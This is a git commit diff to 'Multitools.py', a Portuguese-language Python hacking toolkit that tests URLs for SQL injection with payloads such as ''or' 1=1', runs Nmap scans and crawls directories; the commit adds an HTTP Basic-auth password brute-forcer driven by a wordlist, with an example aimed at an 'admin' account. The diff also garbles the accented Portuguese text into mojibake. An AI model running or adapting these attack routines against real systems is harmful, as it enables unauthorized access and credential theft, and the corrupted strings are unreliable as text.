74c96cd6d7e3a205e6a038ce0a9abe9c8bc8b3aa
DeividWillyan <deiviid_@hotmail.com>
2016-01-25 21:39:28 -0200

    Update Multitools.py

--- Multitools/Multitools.py
+++ Multitools/Multitools.py
@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
+# Desenvolvido por Deivid Willayn / https://www.facebook.com/DeividWillyan
 
-import sys, urllib, urllib.request, hashlib, os, simplejson, urllib.parse, optparse, nmap
+import sys, urllib, urllib.request, hashlib, os, simplejson, urllib.parse, optparse, nmap, requests
 
 ####################################################################################################################
 
 #Deivid Willyan
-#MuiltiTools 30/11/2015 Versão 0.7
-#Adicionado na Versão 0.7 Crawler, Implementar futuramente thread para melhor performece.
-#Adicionado na Versão 0.7 Wordlist.
+#MuiltiTools 30/11/2015 VersÃ£o 0.7
+#Adicionado na VersÃ£o 0.7 Crawler, Implementar futuramente thread para melhor performece.
+#Adicionado na VersÃ£o 0.7 Wordlist.
 
 ################################################# BANNER ########################################################### 
 
@@ -19,8 +20,7 @@ print("""\033[01;35m
        \/    \/\__,_|_|\__|_|\/   \___/ \___/|_|___/
                                        Deivid Willyan @ZeusHz
 
-
-Opções: 
+OpÃ§Ãµes: 
 	 -u 				URL para teste de SQLi
 	 -g 				Efetur uma busca no google
 	 -n 				Utilizar Nmap Scanner
@@ -28,17 +28,19 @@ Opções:
 	 -l 				Utilizar Wordlist
 
 Exemplo:
-	  python3 -h
-	  python3 -g pesquisa no google
-	  python3 -u http://www.alvo.com/noticias.php?id=1
-	  python3 -c http://www.alvo.com
-	  python3 -c http://www.alvo.com -l /tmp/wordlist.txt
-	  python3 -n www.alvo.com
+	  ./MuiltiTools.py  -h
+	  ./MuiltiTools.py  -g pesquisa no google
+	  ./MuiltiTools.py  -u http://www.alvo.com/noticias.php?id=1
+	  ./MuiltiTools.py  -c http://www.alvo.com
+	  ./MuiltiTools.py  -c http://www.alvo.com -l /tmp/wordlist.txt
+	  ./MuiltiTools.py  -n www.alvo.com
+	  ./MuiltiTools.py  -t 192.168.0.1 -U admin -l /tmp/wordlist.txt 
 	\033[0m""")
 
 ############################################# TESTE DE SQLi ########################################################
 
 def SqlInjectionTeste():
+	
 	sqlvetor = ["\'", "\'or\' 1=1", "1\' or \'1\' = \'1\'"]
 
 	urlcompleta = url		
@@ -63,11 +65,12 @@ def SqlInjectionTeste():
 			if (("Warning") in z) or (("MySQL") in z) or (("syntax") in z): 
 				print ("\033[01;37m[V] Possivelmente Vulneravel...\033[0m\n")
 			else:
-				print ("\033[01;31m[X] Não Vulneravel...\033[0m\n")
+				print ("\033[01;31m[X] NÃ£o Vulneravel...\033[0m\n")
 
 ############################################# PROCURA NO GOOGLE #####################################################
 
 def buscaNoGoogle():
+	
 	queryDaBusca = urllib.parse.urlencode({'q' : google})
 	url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&%s&start=0' % (queryDaBusca)
 	resultadosDaBusca = urllib.request.urlopen(url, None, None)
@@ -131,7 +134,36 @@ def crawler():
 				print ("[%d] => %s" % (x.code, url))
 			pass
 
-############################################# MENU DE OPÇÕES ########################################################
+############################################# BRUTE FORCE ###########################################################
+
+def bruteForce(target, usuario, wordlist):
+	
+	fd = open(wordlist, 'r')
+	passwords = fd.readlines()
+	i = 0
+    
+	for password in passwords:
+		i = i + 1
+
+		password = password.rstrip()
+        
+		test = requests.get('http://'+target, auth=(usuario, password))
+		code = test.status_code
+
+		print('[%s]         USER[%s]          PASS [%s]' % (i,usuario,password))
+        
+		if code == 200:
+			print("")
+			print("========================[LOGIN ENCONTRADO]========================")
+			print("")
+			print("               [  :: USER[%s] AND PASS[%s]  ]                      " % (usuario, password))
+			print("")
+
+			sys.exit()
+		else:
+			pass
+
+############################################# MENU DE OPÃ‡Ã•ES ########################################################
 
 parser = optparse.OptionParser()
 parser.add_option("-u", dest="url", type="string", help="Digite a URL")
@@ -139,6 +171,8 @@ parser.add_option("-g", dest="google", type="string", help="Pesquisa no Google")
 parser.add_option("-n", dest="nmapScan", type="string", help="Scanner Nmap")
 parser.add_option("-c", dest="crawlerscan", type="string", help="Web Crawler Scanner")
 parser.add_option("-l", dest="wordlist", type="string", help="Wordlist Crawler")
+parser.add_option("-U", dest="usuario", type="string", help="Usuario")
+parser.add_option("-t", dest="target", type="string", help="Alvo")
 
 (options, args) = parser.parse_args()
 
@@ -147,6 +181,8 @@ google = options.google
 nmapScan = options.nmapScan
 crawlerscan = options.crawlerscan
 wordlist = options.wordlist
+usuario = options.usuario
+target = options.target
 
 #Chama os Metodos dependendo do argumento passado.
 
@@ -158,3 +194,5 @@ elif (nmapScan):
 	nmapScanner()
 elif (crawlerscan):
 	crawler()
+elif (target and usuario and wordlist):
+	bruteForce(target,usuario, wordlist)
